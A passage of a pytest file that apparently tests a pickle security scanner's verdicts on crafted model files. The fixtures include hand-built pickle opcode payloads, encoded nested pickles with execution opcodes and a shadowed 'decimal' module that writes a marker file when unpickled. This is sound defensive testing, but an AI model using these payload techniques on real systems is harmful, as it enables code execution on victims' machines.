                name="Gadget",
                import_reference="private_payload.Gadget",
                reason="module_source_unavailable",
            ),
        ),
    )

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.SUSPICIOUS
    assert updated.findings == (finding,)
    assert updated.metadata["analysis_incomplete"] is True


def test_with_call_graph_findings_preserves_startup_hook_findings_before_limit_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    partial_finding = StartupHookWriteFinding(
        opener_module="click",
        opener_name="open_file",
        writer_module="click",
        writer_name="echo",
        opener_import_reference="click.open_file",
        writer_import_reference="click.echo",
        open_sink="builtins.open",
        write_sink="binary_file.write",
        opener_call_path=("click.open_file", "builtins.open"),
        writer_call_path=("click.echo", "binary_file.write"),
    )

    def raise_startup_hook_limit(*_args: object, **_kwargs: object) -> tuple[StartupHookWriteFinding, ...]:
        raise _CallGraphAnalysisLimitError(
            "assignment alias analysis entered a propagation cycle",
            partial_startup_hook_write_findings=(partial_finding,),
        )

    monkeypatch.setattr(package_api, "find_startup_hook_write_call_graphs", raise_startup_hook_limit)
    report = PickleReport(
        source="partial-startup-hook-findings.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={"import_references": ()},
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.MALICIOUS
    assert updated.metadata["analysis_incomplete"] is True
    startup_findings = [
        finding for finding in updated.findings if finding.rule_code == "DANGEROUS_CALL_GRAPH_FILE_WRITE"
    ]
    assert len(startup_findings) == 1
    assert startup_findings[0].details["opener_name"] == "open_file"
    assert startup_findings[0].details["name"] == "echo"
    assert any(
        error.category == "call_graph_analysis_error"
        and error.exception_type == "_CallGraphAnalysisLimitError"
        and error.details["analysis"] == "python_call_graph_startup_hook_write"
        for error in updated.errors
    )


def test_with_call_graph_findings_marks_source_unavailable_enrichment_failures_incomplete(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def raise_source_unavailable_error(*_args: object, **_kwargs: object) -> tuple[()]:
        raise RuntimeError("source graph exploded")

    monkeypatch.setattr(
        package_api,
        "find_unanalyzed_callable_call_graph_references",
        raise_source_unavailable_error,
    )
    report = PickleReport(
        source="source-unavailable-enrichment-error.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={"callable_invocations": ({"module": "module", "name": "invoke"},)},
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.UNKNOWN
    assert updated.findings == ()
    assert updated.metadata["analysis_incomplete"] is True
    assert any(
        error.message == "Python call-graph analysis could not complete: source graph exploded"
        and error.category == "call_graph_analysis_error"
        and error.exception_type == "RuntimeError"
        and error.details["analysis"] == "python_call_graph_source_unavailable"
        and error.details["analysis_incomplete"] is True
        for error in updated.errors
    )


def test_with_call_graph_findings_ignores_click_startup_hook_paths_when_invocations_truncated() -> None:
    pytest.importorskip("click")

    report = PickleReport(
        source="click-startup-hook-truncated-invocations.pkl",
        status=ScanStatus.INCONCLUSIVE,
        verdict=SafetyVerdict.UNKNOWN,
        metadata={
            "import_references": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
            "callable_invocations": (),
            "callable_invocations_truncated": True,
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == report.status
    assert updated.verdict == SafetyVerdict.UNKNOWN
    assert updated.findings == ()


@pytest.mark.parametrize(
    "metadata_key",
    ["callable_invocations_truncated", "non_allowlisted_global_imports_truncated"],
)
def test_with_call_graph_findings_keeps_import_warning_when_metadata_truncated(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    metadata_key: str,
) -> None:
    module_name = f"modelaudit_c095_truncated_invocation_{uuid.uuid4().hex}"
    (tmp_path / f"{module_name}.py").write_text("class Gadget:\n    pass\n", encoding="utf-8")
    monkeypatch.syspath_prepend(str(tmp_path))
    finding = Finding(
        message="custom global may have been invoked",
        severity=Severity.WARNING,
        location="truncated-invocation.pkl",
        rule_code="NON_ALLOWLISTED_GLOBAL",
        details={
            "module": module_name,
            "name": "Gadget",
            "import_reference": f"{module_name}.Gadget",
            "position": 0,
        },
    )
    report = PickleReport(
        source="truncated-invocation.pkl",
        status=ScanStatus.INCONCLUSIVE,
        verdict=SafetyVerdict.SUSPICIOUS,
        findings=(finding,),
        metadata={
            "callable_invocations": (),
            metadata_key: True,
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == report.status
    assert updated.verdict == report.verdict
    assert updated.findings == (finding,)


def test_with_call_graph_findings_keeps_import_warning_when_invocation_classification_fails(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def raise_classification_error(_callable_invocations: object) -> frozenset[int]:
        raise RuntimeError("invocation classification failed")

    monkeypatch.setattr(package_api, "_invoked_global_positions", raise_classification_error)
    monkeypatch.setattr(
        package_api,
        "_proven_inert_initialization_modules",
        lambda _report: frozenset({"decimal"}),
    )
    finding = Finding(
        message="custom global may have been invoked",
        severity=Severity.WARNING,
        location="classification-error.pkl",
        rule_code="NON_ALLOWLISTED_GLOBAL",
        details={
            "module": "decimal",
            "name": "Decimal",
            "import_reference": "decimal.Decimal",
            "position": 0,
        },
    )
    report = PickleReport(
        source="classification-error.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.SUSPICIOUS,
        findings=(finding,),
        metadata={"callable_invocations": ()},
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == ScanStatus.INCONCLUSIVE
    assert updated.verdict == SafetyVerdict.SUSPICIOUS
    assert updated.findings == (finding,)
    assert any(
        error.exception_type == "RuntimeError"
        and error.details["analysis"] == "python_import_invocation_classification"
        and error.details["analysis_incomplete"] is True
        for error in updated.errors
    )


def test_safe_import_suppression_does_not_cross_invocation_positions() -> None:
    reference = ("_xxsubinterpreters", "create")
    finding = Finding(
        message="separate incomplete invocation",
        severity=Severity.WARNING,
        location="multiple-invocations.pkl (pos 100)",
        rule_code="NON_ALLOWLISTED_GLOBAL",
        details={
            "module": reference[0],
            "name": reference[1],
            "import_reference": ".".join(reference),
            "position": 100,
            "invoked": True,
        },
    )

    proven_safe = package_api._non_allowlisted_import_finding_is_proven_safe(
        finding,
        inert_initialization_modules=frozenset(),
        trusted_import_references=frozenset({reference}),
        invoked_global_positions=frozenset({100}),
        analyzed_invocation_global_positions=frozenset({0}),
        analyzed_invocation_references=frozenset({reference}),
        trusted_reconstruction_global_positions=frozenset(),
        trusted_reconstruction_references=frozenset(),
    )

    assert proven_safe is False


def test_with_call_graph_findings_detects_startup_hook_when_only_import_findings_truncated() -> None:
    pytest.importorskip("click")

    report = PickleReport(
        source="click-startup-hook-truncated-import-findings.pkl",
        status=ScanStatus.INCONCLUSIVE,
        verdict=SafetyVerdict.UNKNOWN,
        metadata={
            "import_references": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
            "callable_invocations": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
            "non_allowlisted_global_imports_truncated": True,
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "DANGEROUS_CALL_GRAPH_FILE_WRITE" for finding in updated.findings)


def test_with_call_graph_findings_keeps_late_click_startup_hook_invocations() -> None:
    pytest.importorskip("click")

    report = PickleReport(
        source="click-startup-hook-late-invocations.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.CLEAN,
        metadata={
            "import_references": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
            "callable_invocations": (
                *({"module": "module", "name": f"call_{index}"} for index in range(32)),
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "DANGEROUS_CALL_GRAPH_FILE_WRITE" for finding in updated.findings)


def test_with_call_graph_findings_ignores_click_startup_hook_paths_when_scan_is_inconclusive() -> None:
    pytest.importorskip("click")

    report = PickleReport(
        source="click-startup-hook-incomplete.pkl",
        status=ScanStatus.INCONCLUSIVE,
        verdict=SafetyVerdict.UNKNOWN,
        metadata={
            "import_references": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
            "callable_invocations": (),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == report.status
    assert updated.verdict == SafetyVerdict.UNKNOWN
    assert updated.findings == ()


def test_find_startup_hook_write_call_graphs_preserves_legacy_import_only_calls() -> None:
    pytest.importorskip("click")

    findings = find_startup_hook_write_call_graphs(
        (
            {"module": "click", "name": "open_file"},
            {"module": "click", "name": "echo"},
        )
    )

    assert len(findings) == 1
    assert findings[0].opener_import_reference == "click.open_file"
    assert findings[0].writer_import_reference == "click.echo"


def test_scan_bytes_keeps_import_only_click_startup_hook_paths_clean() -> None:
    pytest.importorskip("click")

    payload = b"\x80\x04cclick\nopen_file\ncclick\necho\n\x86."

    report = scan_bytes(payload, source="click-startup-hook-import-only.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert report.metadata["import_references"] == (
        {
            "import_reference": "click.open_file",
            "module": "click",
            "name": "open_file",
            "opcode": "GLOBAL",
            "position": 2,
            "is_dangerous": False,
            "requires_origin_verification": True,
        },
        {
            "import_reference": "click.echo",
            "module": "click",
            "name": "echo",
            "opcode": "GLOBAL",
            "position": 19,
            "is_dangerous": False,
            "requires_origin_verification": True,
        },
    )
    assert report.metadata["callable_invocations"] == ()


def test_scan_bytes_keeps_import_only_click_startup_hook_paths_unknown_after_benign_follow_on() -> None:
    pytest.importorskip("click")

    payload = (
        b"\x80\x04cclick\nopen_file\ncclick\necho\n\x86."
        + (b"\x00" * 4096)
        + pickle.dumps({"benign": True}, protocol=4)
    )

    report = scan_bytes(payload, source="click-startup-hook-import-only-follow-on.pkl")

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert report.metadata["callable_invocations"] == ()


def test_with_call_graph_findings_dedupes_click_startup_hook_write_when_writer_is_already_critical() -> None:
    pytest.importorskip("click")

    existing_finding = Finding(
        message="existing critical writer finding",
        severity=Severity.CRITICAL,
        location="click-startup-hook-write-dedupe.pkl",
        rule_code="DANGEROUS_CALL",
        details={"module": "click", "name": "echo"},
    )
    report = PickleReport(
        source="click-startup-hook-write-dedupe.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.MALICIOUS,
        findings=(existing_finding,),
        metadata={
            "import_references": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
            "callable_invocations": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == report.status
    assert updated.verdict == report.verdict
    assert updated.findings == (existing_finding,)


def test_with_call_graph_findings_dedupes_click_startup_hook_write_when_opener_is_already_critical() -> None:
    pytest.importorskip("click")

    existing_finding = Finding(
        message="existing critical opener finding",
        severity=Severity.CRITICAL,
        location="click-startup-hook-write-dedupe.pkl",
        rule_code="DANGEROUS_CALL",
        details={"module": "click", "name": "open_file"},
    )
    report = PickleReport(
        source="click-startup-hook-write-dedupe.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.MALICIOUS,
        findings=(existing_finding,),
        metadata={
            "import_references": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
            "callable_invocations": (
                {"module": "click", "name": "open_file"},
                {"module": "click", "name": "echo"},
            ),
        },
    )

    updated = package_api._with_call_graph_findings(report)

    assert updated.status == report.status
    assert updated.verdict == report.verdict
    assert updated.findings == (existing_finding,)


def test_scan_bytes_warns_on_main_module_global_references() -> None:
    payload = b"\x80\x04\x8c\x08__main__\x94\x8c\x0aCustomType\x94\x93."

    report = scan_bytes(payload, source="custom-main.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "S203"
        and finding.severity.value == "warning"
        and finding.details.get("import_reference") == "__main__.CustomType"
        for finding in report.findings
    )


def test_scan_bytes_does_not_scan_raw_binbytes_payloads_as_text_strings() -> None:
    # Opaque tensor byte blobs are probed for nested pickle streams, but are not
    # decoded as source text in the standalone package; root ModelAudit raw
    # detectors own non-pickle text scanning on bounded file windows.
    payload = pickle.dumps({"blob": b"A" * 256 + b"subprocess.run exec("}, protocol=4)

    report = scan_bytes(payload, source="tensor-bytes.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


def test_scan_bytes_records_data_only_raw_nested_pickle_payloads_as_notices() -> None:
    nested_payload = pickle.dumps({"inner": "data"}, protocol=4)
    report = scan_bytes(
        pickle.dumps({"outer": nested_payload}, protocol=4),
        source="nested-raw.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert any(
        notice.code == "nested_payload_detected"
        and notice.details.get("encoding") == "raw"
        and notice.details.get("nested_has_execution_opcode") is False
        for notice in report.notices
    )


def test_scan_bytes_warns_on_nested_allowlisted_global_from_shadow_module(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    marker = tmp_path / "nested_decimal_shadow_marker"
    (tmp_path / "decimal.py").write_text(
        f"open({str(marker)!r}, 'w').write('owned')\nclass Decimal:\n    pass\n",
        encoding="utf-8",
    )
    monkeypatch.syspath_prepend(str(tmp_path))
    nested_payload = b"cdecimal\nDecimal\n."
    outer_payload = pickle.dumps(nested_payload, protocol=4)

    report = scan_bytes(outer_payload, source="nested-shadowed-decimal.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert marker.exists() is False
    assert any(
        finding.rule_code == "NON_ALLOWLISTED_GLOBAL" and finding.details.get("import_reference") == "decimal.Decimal"
        for finding in report.findings
    )
    load_payload = (
        f"import pickle, sys; sys.path.insert(0, {str(tmp_path)!r}); pickle.loads(pickle.loads({outer_payload!r}))"
    )
    subprocess.run([sys.executable, "-c", load_payload], check=True)
    assert marker.read_text(encoding="utf-8") == "owned"


def test_scan_bytes_allows_nested_import_only_trusted_constructor() -> None:
    nested_payload = b"cdecimal\nDecimal\n."

    report = scan_bytes(
        pickle.dumps(nested_payload, protocol=4),
        source="nested-trusted-decimal.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


@pytest.mark.parametrize(
    "inner_obj",
    [
        datetime.datetime(2024, 1, 2, 3, 4, 5),
        datetime.timedelta(days=2, seconds=3),
        decimal.Decimal("12.34"),
        uuid.UUID("12345678-1234-5678-1234-567812345678"),
        collections.OrderedDict([("a", 1), ("b", 2)]),
        collections.Counter("abcaba"),
        PurePosixPath("/tmp/model.bin"),
        re.compile(r"a+b?"),
        slice(1, 10, 2),
        range(10),
    ],
)
@pytest.mark.parametrize("encoding", ["raw", "base64", "hex"])
def test_scan_bytes_treats_benign_nested_constructor_pickles_as_notices(
    inner_obj: object,
    encoding: str,
) -> None:
    nested_payload = pickle.dumps(inner_obj, protocol=4)
    if encoding == "raw":
        outer_value: bytes | str = nested_payload
        expected_notice = "nested_payload_detected"
    elif encoding == "base64":
        outer_value = base64.b64encode(nested_payload).decode("ascii")
        expected_notice = "encoded_nested_payload_detected"
    else:
        outer_value = binascii.hexlify(nested_payload).decode("ascii")
        expected_notice = "encoded_nested_payload_detected"

    report = scan_bytes(
        pickle.dumps({"outer": outer_value}, protocol=4),
        source=f"benign-nested-{encoding}.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert any(
        notice.code == expected_notice
        and notice.details.get("encoding") == encoding
        and notice.details.get("nested_has_execution_opcode") is True
        for notice in report.notices
    )


@pytest.mark.parametrize("encoding", ["raw", "base64", "hex"])
def test_scan_bytes_does_not_escalate_warning_only_nested_payloads_to_critical(
    encoding: str,
) -> None:
    nested_payload = pickle.dumps(functools.partial(int, base=10), protocol=4)
    if encoding == "raw":
        outer_value: bytes | str = nested_payload
    elif encoding == "base64":
        outer_value = base64.b64encode(nested_payload).decode("ascii")
    else:
        outer_value = binascii.hexlify(nested_payload).decode("ascii")

    report = scan_bytes(
        pickle.dumps({"outer": outer_value}, protocol=4),
        source=f"warning-only-nested-{encoding}.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert not any(finding.severity == Severity.CRITICAL for finding in report.findings)
    assert not any(finding.rule_code in {"S213", "S601", "S602"} for finding in report.findings)
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.severity == Severity.WARNING
        and finding.details.get("import_reference") == "functools.partial"
        for finding in report.findings
    )


@pytest.mark.parametrize("encoding", ["raw", "base64", "hex"])
def test_scan_bytes_flags_unclassified_nested_execution_callables(encoding: str) -> None:
    nested_payload = b"\x80\x04cbuiltins\nprint\n\x8c\x0bnested ping\x85R."
    if encoding == "raw":
        outer_value: bytes | str = nested_payload
        expected_rule_code = "S213"
    elif encoding == "base64":
        outer_value = base64.b64encode(nested_payload).decode("ascii")
        expected_rule_code = "S601"
    else:
        outer_value = binascii.hexlify(nested_payload).decode("ascii")
        expected_rule_code = "S602"

    report = scan_bytes(
        pickle.dumps({"outer": outer_value}, protocol=4),
        source=f"unclassified-nested-execution-{encoding}.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == expected_rule_code and finding.details.get("nested_has_execution_opcode") is True
        for finding in report.findings
    )


def test_scan_bytes_records_data_only_raw_nested_pickle_hidden_inside_large_literal_as_notice() -> None:
    nested_payload = pickle.dumps({"inner": "data"}, protocol=4)
    hidden_payload = b"A" * 64 + nested_payload + b"B" * 64

    report = scan_bytes(
        pickle.dumps({"outer": hidden_payload}, protocol=4),
        source="hidden-raw-nested.pkl",
        options=ScanOptions(max_nested_pickle_bytes=len(nested_payload) + 16),
    )

    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert any(notice.code == "nested_payload_detected" for notice in report.notices)


def test_scan_bytes_ignores_invalid_raw_nested_pickle_near_match_hidden_inside_large_literal() -> None:
    nested_payload = _corrupt_first_byte(pickle.dumps({"inner": "data"}, protocol=4))
    hidden_payload = b"A" * 64 + nested_payload + b"B" * 64

    report = scan_bytes(
        pickle.dumps({"outer": hidden_payload}, protocol=4),
        source="hidden-raw-nested-near-match.pkl",
        options=ScanOptions(max_nested_pickle_bytes=len(nested_payload) + 16),
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "S213" for finding in report.findings)


def test_scan_bytes_surfaces_nested_pickle_inner_findings() -> None:
    nested_payload = pickle.dumps(MaliciousPayload(), protocol=4)

    report = scan_bytes(
        pickle.dumps({"outer": nested_payload}, protocol=4),
        source="nested-malicious.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "S213" for finding in report.findings)
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.message.startswith("Nested pickle finding:")
        and finding.details.get("nested_encoding") == "raw"
        and finding.details.get("nested_details", {}).get("import_reference") in SYSTEM_GLOBALS
        for finding in report.findings
    )


def test_scan_bytes_zero_nested_depth_still_flags_nested_pickle() -> None:
    nested_payload = pickle.dumps(MaliciousPayload(), protocol=4)

    report = scan_bytes(
        pickle.dumps({"outer": nested_payload}, protocol=4),
        source="zero-depth-nested-malicious.pkl",
        options=ScanOptions(max_nested_depth=0),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("analysis_incomplete") is True
        and finding.details.get("incomplete_reason") == "max_nested_depth"
        for finding in report.findings
    )


def test_scan_bytes_surfaces_deep_nested_pickle_findings_without_parse_incomplete() -> None:
    deepest_payload = pickle.dumps(MaliciousPayload(), protocol=4)
    nested_payload = pickle.dumps({"middle": deepest_payload}, protocol=4)

    report = scan_bytes(
        pickle.dumps({"outer": nested_payload}, protocol=4),
        source="deep-nested-malicious.pkl",
        options=ScanOptions(max_nested_depth=2),
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert not any(
        notice.code == "parse_incomplete" and notice.details.get("exception_type") == "TypeError"
        for notice in report.notices
    )
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.message.startswith("Nested pickle finding: Nested pickle finding:")
        and finding.details.get("nested_details", {}).get("nested_details", {}).get("import_reference")
        in SYSTEM_GLOBALS
        for finding in report.findings
    )


def test_scan_bytes_default_depth_surfaces_two_layer_encoded_nested_findings() -> None:
    deepest_payload = pickle.dumps(MaliciousPayload(), protocol=4)
    nested_payload = pickle.dumps(
        {"middle": base64.b64encode(deepest_payload).decode("ascii")},
        protocol=4,
    )
    outer_payload = pickle.dumps(
        {"outer": base64.b64encode(nested_payload).decode("ascii")},
        protocol=4,
    )

    report = scan_bytes(outer_payload, source="default-deep-encoded-nested.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.message.startswith("Nested pickle finding: Nested pickle finding:")
        and finding.details.get("nested_details", {}).get("nested_details", {}).get("import_reference")
        in SYSTEM_GLOBALS
        for finding in report.findings
    )


def test_scan_bytes_respects_literal_budget_before_nested_analysis() -> None:
    nested_payload = pickle.dumps({"code": "A" * 128}, protocol=4)

    report = scan_bytes(
        pickle.dumps({"outer": nested_payload}, protocol=4),
        source="nested-incomplete.pkl",
        options=ScanOptions(max_string_literal_scan_chars=8),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert any(
        notice.code == "literal_scan_truncated"
        and notice.details.get("max_string_literal_scan_chars") == 8
        and notice.details.get("analysis_incomplete") is True
        for notice in report.notices
    )
    assert not any(notice.code == "nested_pickle_incomplete" for notice in report.notices)


def test_scan_bytes_flags_oversized_nested_pickle_prefix_without_deep_parse() -> None:
    nested_payload = b"\x80\x04]K\x01aK\x02aK\x03aK\x04a"

    report = scan_bytes(
        pickle.dumps({"outer": nested_payload}, protocol=4),
        source="nested-oversized.pkl",
        options=ScanOptions(max_nested_pickle_bytes=8),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert report.is_clean is False
    assert report.coverage.opcode_scan_complete is False
    assert any(
        finding.rule_code == "S213"
        and finding.details.get("analysis_incomplete") is True
        and finding.details.get("payload_size") == len(nested_payload)
        for finding in report.findings
    )
    assert any(
        notice.code == "nested_payload_truncated"
        and notice.details.get("encoding") == "raw"
        and notice.details.get("analysis_incomplete") is True
        for notice in report.notices
    )


@pytest.mark.parametrize(
    "opaque_blob",
    [
        b"A" * 64 + b"\x80\x04" + (b"\xff" * 64),
        b"A" * 64 + b"i\x69\xb2\x09\x48\xbe\x7d\x02\x6b\x23\x5f\xe0\xf7\x0a\x8a\x5c\x77",
    ],
)
def test_scan_bytes_ignores_invalid_pickle_prefix_inside_opaque_bytes(opaque_blob: bytes) -> None:
    report = scan_bytes(
        pickle.dumps({"outer": opaque_blob}, protocol=4),
        source="opaque-random-bytes.pkl",
        options=ScanOptions(max_nested_pickle_bytes=8),
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()


@pytest.mark.parametrize("fragment", [b"q\x00.", b"t.", b"cfoo\nbar\n0."])
def test_scan_bytes_does_not_flag_stack_invalid_nested_pickle_fragments(fragment: bytes) -> None:
    report = scan_bytes(pickle.dumps({"outer": fragment}, protocol=4), source="nested-fragment.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "S213" for finding in report.findings)


@pytest.mark.parametrize("fragment", [b"q\x00.", b"t.", b"cfoo\nbar\n0."])
def test_scan_bytes_does_not_flag_stack_invalid_encoded_pickle_fragments(fragment: bytes) -> None:
    encoded = base64.b64encode(fragment).decode("ascii")
    report = scan_bytes(pickle.dumps({"outer": encoded}, protocol=4), source="nested-fragment.pkl")

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert all(finding.rule_code != "S601" for finding in report.findings)


def test_scan_bytes_ignores_short_base64_pickle_collision_in_plain_text() -> None:
    assert base64.b64decode("grou") == b"\x82\xba."

    report = scan_bytes(
        pickle.dumps({"metadata": "grouped convolution"}, protocol=4),
        source="short-base64-collision.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert all(notice.code != "encoded_nested_payload_detected" for notice in report.notices)


def test_scan_bytes_preserves_single_quartet_base64_execution_payload() -> None:
    nested_payload = b"NQ."
    encoded = base64.b64encode(nested_payload).decode("ascii")
    report = scan_bytes(
        pickle.dumps({"metadata": encoded}, protocol=4),
        source="single-quartet-base64-execution.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    assert any(
        finding.rule_code == "PERSISTENT_ID" and finding.details.get("nested_details", {}).get("opcode") == "BINPERSID"
        for finding in report.findings
    )
    assert any(
        notice.code == "encoded_nested_payload_detected"
        and notice.details.get("payload_size") == len(nested_payload)
        and notice.details.get("nested_has_execution_opcode") is True
        for notice in report.notices
    )


@pytest.mark.parametrize(
    "metadata",
    [
        "Analytics",
        "Analyze",
        "AnomalyDetector",
        "AvgPool2D",
        "CustomDense",
        "CustomLoader",
        "DynamicTypeCallableAttribute",
        "BloomForCausalLM",
        "PyTorchZipScanner",
        "RandomForest",
        "253DQUERYLEAKSECRET",
        "00bc356079fe8ecc8f9c504bfa310c0a33958a8d",
        "34341261800329426",
        "fullyconnected",
        "lyrics",
        "lzma",
        "org/domains/root/db/wanggou",
        "ordinary ApiDef metadata",
        "ordinary BloomModel metadata",
        "ordinary VOCABULARY metadata",
        "/long_grou",
        "BIO_lookup_ex",
        "UIBarAppearance",
        "UIProgressView",
        "UNIXConnectable",
        "CATEGORY_LINEBREAK: CATEGORY_UNI_LINEBREAK,",
        "if group and not (len(group)==1 and group[0][0] == 'equal'):",
        "if group.title not in title_group_map:",
        "#         next rollover is simply 6 - 2 - 1, or 3.",
        "# compute product y*log(x) = yc*lxc*10**(-p-b-1+ye) = pc*10**(-p-1)",
        "'HTTPPasswordMgrWithPriorAuth', 'AbstractBasicAuthHandler',",
    ],
)
def test_scan_bytes_ignores_short_word_base64_near_matches(metadata: str) -> None:
    report = scan_bytes(
        pickle.dumps({"metadata": metadata}, protocol=4),
        source="short-base64-word-near-match.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.findings == ()
    assert all(
        notice.code not in {"encoded_nested_payload_detected", "nested_pickle_incomplete"} for notice in report.notices
    )


@pytest.mark.parametrize(
    "encoded",
    [
        "ggEpUi4=",
        "ggEpUi4==",
        "ggEpUi4===",
        "ggEp!Ui4=",
        "g!gEpUi4=",
        "ggEp Ui4=",
        "ggEp\nUi4=",
        "ggEp.Ui4=",
        "g=gEpUi4=",
        "gg=EpUi4=",
        "ggEpU=i4=",
        "ggEpUi=4=",
        "=ggEpUi4=",
    ],
)
def test_scan_bytes_preserves_compact_base64_execution_payload_detection(
    encoded: str,
) -> None:
    nested_payload = b"\x82\x01)R."
    assert base64.b64decode(encoded) == nested_payload
    report = scan_bytes(
        pickle.dumps({"metadata": encoded}, protocol=4),
        source="compact-base64-execution.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(
        finding.rule_code == "S601"
        and finding.details.get("payload_size") == len(nested_payload)
        and finding.details.get("nested_has_execution_opcode") is True
        for finding in report.findings
    )
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.details.get("nested_details", {}).get("opaque_extension") is True
        for finding in report.findings
    )


@pytest.mark.parametrize(
    ("encoded", "expected_rule"),
    [
        ("gA!Q=", "S601"),
        ("ly!4=", "S601"),
        ("l5!gu", "S601"),
        ("UA!ou", "PERSISTENT_ID"),
        ("Tl!Eu", "PERSISTENT_ID"),
        ("l=y4=", "S601"),
        ("ly=4=", "S601"),
        ("l=5gu", "S601"),
        ("l5=gu", "S601"),
        ("l5gu============", "S601"),
        ("ly4=============", "S601"),
        ("U=Aou", "PERSISTENT_ID"),
        ("UA=ou", "PERSISTENT_ID"),
        ("T=lEu", "PERSISTENT_ID"),
        ("Tl=Eu", "PERSISTENT_ID"),
        ("=ly4=", "S601"),
        ("=l5gu", "S601"),
        ("=UAou", "PERSISTENT_ID"),
        ("=TlEu", "PERSISTENT_ID"),
        ("!ly4!=", "S601"),
        ("!UAo!u", "PERSISTENT_ID"),
        ("AAAA=ly4=", "S601"),
        ("AAAA==ly4=", "S601"),
        ("grou=ly4=", "S601"),
        ("A" * 64 + "=ly4=", "S601"),
    ],
)
def test_scan_bytes_preserves_lenient_compact_base64_security_evidence(
    encoded: str,
    expected_rule: str,
) -> None:
    report = scan_bytes(
